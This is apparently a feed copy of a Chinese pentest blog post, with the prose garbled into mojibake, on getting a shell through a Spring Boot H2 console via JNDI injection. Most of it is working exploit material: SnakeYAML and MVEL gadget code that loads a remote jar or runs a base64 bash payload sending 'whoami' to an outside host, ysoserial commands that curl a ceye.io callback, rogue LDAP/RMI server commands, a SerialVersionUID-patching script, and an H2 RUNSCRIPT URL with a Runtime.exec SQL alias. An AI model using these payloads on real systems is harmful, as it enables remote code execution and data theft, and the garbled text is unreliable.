punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">TestClass</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestHeader</span><span class="token punctuation">(</span><span class="token string">"X-Api-Version"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> apiVersion<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ThreadContext</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"apiVersion"</span><span class="token punctuation">,</span> apiVersion<span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Received a request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">UpperLookup</span> upperLookup <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpperLookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>upperLookup<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"Hello, API Controller!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç‚å­—è¾ˆå¸ˆå‚…å·²ç»å†™å¥½äº†<a href="https://github.com/kezibei/Urldns">URLDNS</a>ï¼Œå¯ä»¥ç”Ÿæˆæ¢æµ‹éœ€è¦çš„åºåˆ—åŒ–æ•°æ®åŒ…ã€‚å½“å­˜åœ¨JNDIæ³¨å…¥çš„æ—¶å€™ï¼Œå¯åŠ¨LDAPæœåŠ¡:<code>java -jar Urldns.jar ldap all &lt;dnslog&gt;</code>ï¼Œç„¶åä½¿ç”¨PAYLOAD: <code>ldap://&lt;ip&gt;:1389/Hello233</code>ã€‚</p><h4 id="Snkeyml"><a href="#Snkeyml" class="headerlink" title="Snkeyml"></a>Snkeyml</h4><p>å€Ÿç”¨Ceye.ioæ¢æµ‹H2 Databaseçš„é¡µé¢ï¼Œå‘ç°å¯ä»¥åˆ©ç”¨çš„é“¾å¾ˆå¤šï¼Œæ¯”å¦‚<code>cc1, cb17ã€mvelã€snakeyaml</code>ç­‰ï¼Œå…¶ä¸­<code>cc1ã€cb17</code>è¿™äº›é“¾å±äºLDAPååºåˆ—åŒ–ï¼Œ<code>mvelã€snkeyaml</code>å±äºåŠ è½½æœ¬åœ°Classã€‚<br>æµ…è“å¸ˆå‚…åœ¨<a href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDIæ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a>é‡Œé¢è®²çš„å¾ˆè¯¦ç»†ï¼Œè¿™é‡Œé€‰æ‹©ä½¿ç”¨<code>snkeyml</code>æ”»å‡»ï¼Œä¸»è¦åˆ©ç”¨ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_snakeyaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.yaml.snakeyaml.Yaml"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> yaml <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>            <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>            <span class="token string">"    !!java.net.URL [\"http://127.0.0.1:8888/exp.jar\"]\n"</span> <span class="token operator">+</span>            <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>            <span class="token string">"]"</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=load"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> yaml<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ref<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æœåŠ¡ç«¯ä½¿ç”¨RMIæ‰˜ç®¡ï¼Œç„¶åå¼€å¯<a href="https://github.com/artsploit/yaml-payload">yaml-payload.jar</a>ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p><h4 id="Mvel"><a href="#Mvel" class="headerlink" title="Mvel"></a>Mvel</h4><p>åœ¨æ›´æ¢MVELæ‰§è¡Œçš„æ—¶å€™ï¼Œæœ¬åœ°æµ‹è¯•å¼¹è®¡ç®—å™¨æˆåŠŸï¼Œä½†æ˜¯æ¢æˆæ‰§è¡Œå‘½ä»¤å°±ä¼šå¤±è´¥ï¼Œä½¿ç”¨IDEAæœ¬åœ°è°ƒè¯•ä¹‹åå‘ç°æŠŠpushå»æ‰ï¼Œç„¶åå¯ä»¥æ‰§è¡Œå‘½ä»¤æˆåŠŸï¼Œå…·ä½“åŸå› éœ€è¦å†è·Ÿè¸ªä¸€éï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ReferenceWrapper</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span><span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>            <span class="token string">"Runtime.getRuntime().exec('bash -c &#123;echo,Y3VybCBiYWlkdS5jb20vYHdob2FtaWA=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡"><a href="#åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡" class="headerlink" title="åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡"></a>åˆ©ç”¨LDAPè¿”å›ååºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadgetç»•è¿‡</h3><p>LDAP Serveré™¤äº†ä½¿ç”¨JNDI Referenceè¿›è¡Œåˆ©ç”¨ä¹‹å¤–ï¼Œè¿˜æ”¯æŒç›´æ¥è¿”å›ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ã€‚å¦‚æœJavaå¯¹è±¡çš„<code>javaSerializedData</code>å±æ€§å€¼ä¸ä¸ºç©ºï¼Œåˆ™å®¢æˆ·ç«¯çš„<code>obj.decodeObject()</code>æ–¹æ³•å°±ä¼šå¯¹è¿™ä¸ªå­—æ®µçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥åˆ©ç”¨å—å®³è€…æœ¬åœ°CLASSPATHä¸­å­˜åœ¨æ¼æ´çš„ååºåˆ—åŒ–Gadgetè¾¾åˆ°ç»•è¿‡é™åˆ¶æ‰§è¡Œå‘½ä»¤çš„ç›®çš„ã€‚</p><p>ä½¿ç”¨CCé“¾ç”Ÿæˆä¹‹åæ‰˜ç®¡åœ¨LDAPï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopyjava -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">kxcodeå¸ˆå‚…çš„LDAP</a>æ‰˜ç®¡ç”Ÿæˆçš„ååºåˆ—åŒ–æ•°æ®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp HackerRMIRefServer-all.jar HackerLDAPRefServer  <span class="token number">0.0</span>.0.0 <span class="token number">8088</span> <span class="token number">1389</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/from-spring-boot-to-getshell/4.jpg"></p><p>ä½†æ˜¯åœ¨ä½¿ç”¨CommonsBeanutils1é“¾çš„æ—¶å€™ï¼Œæ‰§è¡Œå‘½ä»¤å¤±è´¥:<br><img src="/2022/03/18/from-spring-boot-to-getshell/3.png"><br>å¯ä»¥ä»æŠ¥é”™åŸå› çœ‹å‡ºæ¥ï¼Œå› ä¸ºCommonsBeanutils1çš„ç‰ˆæœ¬ä¸åŒï¼ŒBeanComparatorè¿™ä¸ªç±»çš„<a href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java#L119">SerialVersionUIDä¸ä¸€æ ·</a>ï¼Œä¼šé€ æˆååºåˆ—åŒ–å¤±è´¥ã€‚1.7x-1.8xä¸º<code>-3490850999041592962</code>,1.9xä¸º<code>-2044202215314119608</code>ã€‚<br>æœ‰ä¸¤ç§è§£å†³æ–¹æ³•ï¼š</p><ul><li>æ›¿æ¢ysoserialçš„CommonsBeanutils1ï¼Œä½¿ç”¨<a href="https://github.com/su18/ysoserial">su18å¸ˆå‚…çš„ysoserial</a>: <code>java -jar ysuserial-1.3-su18-all.jar -g CommonsBeanutils1183NOCC -p &#39;open -a Calculator.app&#39; |base64 |pbcopy</code></li><li>ç”Ÿæˆååºåˆ—åŒ–æ•°æ®ä¹‹åï¼Œ<a href="https://github.com/phith0n/zkar">ä¿®æ”¹SerialVersionUID</a>ä¸ºå¯¹åº”ç‰ˆæœ¬çš„å€¼</li></ul><p>åˆšå¥½æ—©ä¸Šçœ‹åˆ°På¸ˆå‚…å‘çš„æ–‡ç« ï¼Œå°è¯•ä½¿ç”¨<a href="https://github.com/phith0n/zkar">zkar</a>ä¿®æ”¹ysoserialç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®åŒ…ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤æˆåŠŸã€‚</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"github.com/phith0n/zkar/serz"</span><span class="token string">"io/ioutil"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>data<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"cb1.ser"</span><span class="token punctuation">)</span>serialization<span class="token punctuation">,</span> err <span class="token operator">:=</span> serz<span class="token punctuation">.</span><span class="token function">FromBytes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span><span class="token string">"parse error"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>object <span class="token operator">:=</span> serialization<span class="token punctuation">.</span>Contents<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Object<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> field <span class="token operator">:=</span> <span class="token keyword">range</span> object<span class="token punctuation">.</span>ClassDatas<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>FieldDatas <span class="token punctuation">&#123;</span><span class="token keyword">if</span> field<span class="token punctuation">.</span>TypeCode <span class="token operator">==</span> <span class="token string">"L"</span> <span class="token punctuation">&#123;</span>classPonter <span class="token operator">:=</span> field<span class="token punctuation">.</span>Object<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>serz<span class="token punctuation">.</span>TCObject<span class="token punctuation">)</span><span class="token punctuation">.</span>ClassPointer<span class="token keyword">if</span> classPonter<span class="token punctuation">.</span>Flag <span class="token operator">==</span> serz<span class="token punctuation">.</span>JAVA_TC_CLASSDESC <span class="token operator">&amp;&amp;</span>classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>ClassName<span class="token punctuation">.</span>Data <span class="token operator">==</span> <span class="token string">"org.apache.commons.beanutils.BeanComparator"</span> <span class="token punctuation">&#123;</span>classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>SerialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3490850999041592962</span><span class="token keyword">break</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"cb1-modify.ser"</span><span class="token punctuation">,</span> serialization<span class="token punctuation">.</span><span class="token function">ToBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0o755</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2 RCE"></a>H2 RCE</h3><p>å‚è€ƒsu18å¸ˆå‚…çš„<a href="https://su18.org/post/jdbc-connection-url-attack/#h2-rce">jdbc-connection-url-attack</a>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;poc.sql&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿œç¨‹æœåŠ¡å™¨çš„æ¶æ„SQL:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ALIAS <span class="token keyword">EXEC</span> <span class="token keyword">AS</span> <span class="token string">'String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return "su18";&#125;'</span><span class="token punctuation">;</span><span class="token keyword">CALL</span> <span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'open -a Calculator.app'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Spring &lt; 2.3.0çš„æ—¶å€™ï¼Œä¼šé»˜è®¤åˆ›å»º<code>jdbc:h2:mem:testdb</code>ï¼ŒSpring &gt;= 2.3.0çš„æ—¶å€™ï¼ŒSpringä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªUUIDéšæœºæ•°æ®åº“åï¼Œæ•°æ®åº“åå¯ä»¥åœ¨Spirngçš„æ—¥å¿—é‡Œçœ‹åˆ°ã€‚</p><p>æ‰€ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•çš„æ—¶å€™éœ€è¦æ»¡è¶³ä»¥ä¸‹ä»»æ„ä¸€ä¸ªæ¡ä»¶ï¼š</p><ul><li>Spring &lt; 2.3.0</li><li>æå‰è·å–åˆ°H2 databaseçš„ç”¨æˆ·å¯†ç </li></ul><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ul><li>RMIæ‰˜ç®¡åœ¨VPSçš„æ—¶å€™ï¼Œä¿®æ”¹<a href="https://github.com/JKme/EvilRMI/blob/main/src/main/java/com/rmi/RmiServer.java#L180">java.rmi.server.hostname</a>ä¸ºè‡ªå·±æœåŠ¡å™¨çš„IPåœ°å€</li><li>åœ¨å®Œå…¨é»‘ç›’çš„æƒ…å†µä¸‹ï¼Œæ³¨æ„SerialVersionUIDä¸åŒ¹é…çš„é—®é¢˜ï¼Œå…·ä½“è§<a href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java">URLDNS</a></li></ul><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://81.68.118.217/index.php/archives/62/">JNDIæ³¨å…¥é«˜ç‰ˆæœ¬ç»•è¿‡</a></li><li><a href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldnsé“¾æ¢æµ‹ç±»å·¥å…·å‘æ”¾</a></li><li><a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">æ„é€ javaæ¢æµ‹classååºåˆ—åŒ–gadget</a></li><li><a href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">è€é“¾æ–°ç”¨ï¼Œåˆ©ç”¨URLDNSé“¾æ¢æµ‹gadget</a></li><li><a href="http://wjlshare.com/archives/1575">ysoserial å·¥å…·æ”¹é€ </a></li><li><a href="https://github.com/phith0n/zkar">zkar</a></li><li><a href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDIæ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a></li><li><a href="https://su18.org/post/jdbc-connection-url-attack">jdbc-connection-url-attack</a></li><li><a href="https://github.com/JKme/EvilRMI">https://github.com/JKme/EvilRMI</a></li><li><a href="https://github.com/su18/ysoserial">æ¨èä½¿ç”¨su18æ˜¯å¦çš„ysoserial</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-åˆ‡å…¥ç‚¹&quot;&gt;&lt;a href=&quot;#0x1-åˆ‡å…¥ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;0x1. åˆ‡å…¥ç‚¹&quot;&gt;&lt;/a&gt;0x1. åˆ‡å…¥ç‚¹&lt;/h2&gt;&lt;p&gt;åœ¨æ—¥å¸¸æµ‹è¯•çš„æ—¶å€™ï¼Œä½¿ç”¨ffufå‘ç°ä¸€ä¸ª&lt;code&gt;/console&lt;/code&gt;çš„æ¥å£ï¼Œæ‰“å¼€ä¹‹åå‘ç°æ˜¯H2 Databaseé¡µé¢ï¼š&lt;br&gt;&lt;img src=&quot;/2022/03/18/from-spring-boot-to-getshell/1.png&quot;&gt;&lt;br&gt;å¦‚æœSpring Booté¡¹ç›®ä¸­åŒ…å«h2databaseå¹¶ä¸”åœ¨é…ç½®æ–‡ä»¶ä¸­å¯ç”¨h2-consoleï¼Œåˆ™å­˜åœ¨&lt;a href=&quot;https://anquan.baidu.com/article/1078&quot;&gt;JNDIæ³¨å…¥æ¼æ´&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;è®¾ç½®&lt;code&gt;Driver Class&lt;/code&gt;ä¸º&lt;code&gt;javax.naming.InitialContext&lt;/code&gt;ï¼Œ&lt;code&gt;JDBC URL&lt;/code&gt;ä¸º&lt;code&gt;ldap://attacker.com/Exploit&lt;/code&gt;ï¼š&lt;br&gt;&lt;img src=&quot;/2022/03/18/from-spring-boot-to-getshell/2.png&quot;&gt;&lt;br&gt;æ ¹æ®&lt;code&gt;/env&lt;/code&gt;æ³„æ¼çš„ä¿¡æ¯ï¼Œå¾—çŸ¥Javaç‰ˆæœ¬æ˜¯1.8.0_312ï¼Œé«˜ç‰ˆæœ¬JDKä¸­ç”±äºé»˜è®¤codebaseä¸ºtrueä»è€Œå¯¼è‡´å®¢æˆ·ç«¯é»˜è®¤ä¸ä¼šè¯·æ±‚è¿œç¨‹Serverä¸Šçš„æ¶æ„ Class, å› æ­¤ä¸å¯ä»¥ç›´æ¥ä½¿ç”¨LDAPåŠ è½½è¿œç¨‹æ¶æ„ä»£ç ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RMIï¼šJDK 8u113ã€JDK 7u122ã€JDK 6u132 èµ· codebase é»˜è®¤ä¸º true&lt;br&gt;LDAPï¼šJDK 11.0.1ã€JDK 8u191ã€JDK 7u201ã€JDK 6u211 èµ· codebase é»˜è®¤ä¸º true&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x2-ç»•è¿‡å’Œåˆ©ç”¨&quot;&gt;&lt;a href=&quot;#0x2-ç»•è¿‡å’Œåˆ©ç”¨&quot; class=&quot;headerlink&quot; title=&quot;0x2. ç»•è¿‡å’Œåˆ©ç”¨&quot;&gt;&lt;/a&gt;0x2. ç»•è¿‡å’Œåˆ©ç”¨&lt;/h2&gt;&lt;h3 id=&quot;åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡&quot;&gt;&lt;a href=&quot;#åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡&quot; class=&quot;headerlink&quot; title=&quot;åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡&quot;&gt;&lt;/a&gt;åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡&lt;/h3&gt;&lt;p&gt;åˆ©ç”¨URLDNSé“¾å¯ä»¥æ¢æµ‹Javaé»‘ç›’åº”ç”¨é‡Œé¢æŸä¸ªç±»æ˜¯å¦å­˜åœ¨, åœ¨ç‚å­—è¾ˆå’Œc0ny1å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw&quot;&gt;Urldnsé“¾æ¢æµ‹ç±»å·¥å…·å‘æ”¾&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA&quot;&gt;æ„é€ javaæ¢æµ‹classååºåˆ—åŒ–gadget&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA&quot;&gt;è€é“¾æ–°ç”¨ï¼Œåˆ©ç”¨URLDNSé“¾æ¢æµ‹gadget&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;URLDNSçš„æµ‹è¯•ä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®åŒ…&lt;code&gt;1.ser&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;net&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;URL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javassist&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javassist&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;CtClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;


